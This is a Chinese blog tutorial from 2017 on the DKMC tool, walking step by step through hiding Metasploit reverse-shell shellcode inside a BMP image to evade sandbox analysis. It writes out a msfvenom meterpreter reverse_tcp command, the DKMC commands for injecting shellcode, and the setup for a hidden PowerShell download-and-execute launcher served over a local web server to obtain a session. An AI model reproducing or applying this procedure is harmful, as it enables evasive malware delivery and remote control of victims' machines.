---
title: DKMC | bmp | Msf | kali linux 2017
date: 2017-09-24 21:53:41
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->

GitHub： https://github.com/Mr-Un1k0d3r/DKMC
youtube：https://youtu.be/xGZ0X5eA2IA

## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/DKMC.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

和往常一样打开一些国外网站，吸收他们的知识，但是有个视频确是深深的吸引了我的眼球，也是一个不错的项目和思路，今天我就给我分享一下这款工具的使用。

## 1.Don't Kill My Cat (DKMC)

DKMC是一个工具，它产生存储在多边形图片内的模糊的shellcode。 该图片是100％有效的，还有100％有效的shellcode。 这个想法是避免沙盒分析，因为它是一个简单的“合法”图片。 现在，该工具依靠PowerShell来执行最终的shellcode有效负载。

基本流程（过程）
1.生成shellcode （msfvenom）
2.将msf的shellcode嵌入到图片内
3.PowerShell下载图片并执行图片作为shellcode
4.得到 shell


## 2.安装使用
```markdown
$ git clone https://github.com/Mr-Un1k0d3r/DKMC 
$ cd DKMC
$ mkdir output
```

![enter description here][2]

## 3.使用前准备

1.将所有类型的图片都转换bmp格式,关于如何转换可自行百度在线转换地址。
我这里已经提前转换好了
![enter description here][3]

2.准备一枚由msfvenom  生成的PAYLOAD，使用为未初始化的格式

![enter description here][4]

```markdown
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORt=4444 -f raw >demon
```


3.启动msfconsole （控制台），进行监听

![enter description here][5]


## 4.正式使用DKMC功能
首先进入它的使用界面
![enter description here][6]

首先来简单介绍一下 
<pre>
1.sc功能 是将msf生成的raw文件 转换位shellcode代码
2.gen 功能 是将其msf的shellcode注入到BMP 图片中
3.ps 功能将其BMP的图片转换为powershell代码
4.web 功能 将其开启web功能
</pre>

## 1.我们首先要用到的是sc功能
（将其msf的shellcode注入到BMP 图片中）

![enter description here][7]

设置msfvenom 生成的文件路径，然后run 生成shellcode
<pre>
(shellcode)>>> set source demon
	[+] source value is set.
(shellcode)>>> run
</pre>
将其shellcode代码进行保存，或者保存到文本文档 ，一会需要用到。
我们使用exit 退出当前模块，回到主菜单界面

![enter description here][8]


## 2.gen 功能 
（是将其msf的shellcode注入到BMP 图片中）

![enter description here][9]

这里需要设置两个地方一个是 
1.转换后的bmp图片文件  2.设置shellcode

![enter description here][10]


![enter description here][11]

之后run ，output中会生成一个新的bmp 是由msfpayload注入生成的，之后我们还是一样exit ，退回主界面。使用ps功能

## 3.ps功能
(功能将其BMP的图片转换为powershell代码)
![enter description here][12]

这里需要设置的是url 这块，格式  set url  http://ip地址 ：端口号 /x.bmp


![enter description here][13]

<pre>
(powershell)>>> set url http://192.168.1.103:8081/output-1506265715.bmp
	[+] url value is set.
(powershell)>>> run
	[+] Powershell script:
powershell.exe -nop -w hidden 
</pre>
复制powershell代码  到文本文档 （可将其编辑格式为bat 或者ps1 即可）（本文不编辑其他格式直接复制粘贴代码）

4.web功能
（开启web服务）

![enter description here][14]

folder  我这里就不设置他 ，因为bmp 生成的默认地址就是这个，需要改动的是我之前设置了url端口为8081，所以我这里也需要设置的一样为8081

![enter description here][15]


## 5.运行代码，得到会话

![enter description here][16]

得到会话，（这里我直接复制粘贴代码，可以选择将其编辑为bat、ps1、exe等格式运行）
![enter description here][17]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/6c74ae2bc33479322e19ba48040ef3ef.jpg 
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263324017.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263654535.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263825342.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506264396655.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263324017.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265200817.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265496004.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265578788.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265769879.jpg
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265917418.jpg
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266034961.jpg
  [13]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266228942.jpg
  [14]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266510548.jpg
  [15]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266631077.jpg
  [16]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266879696.jpg
  [17]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266911876.jpg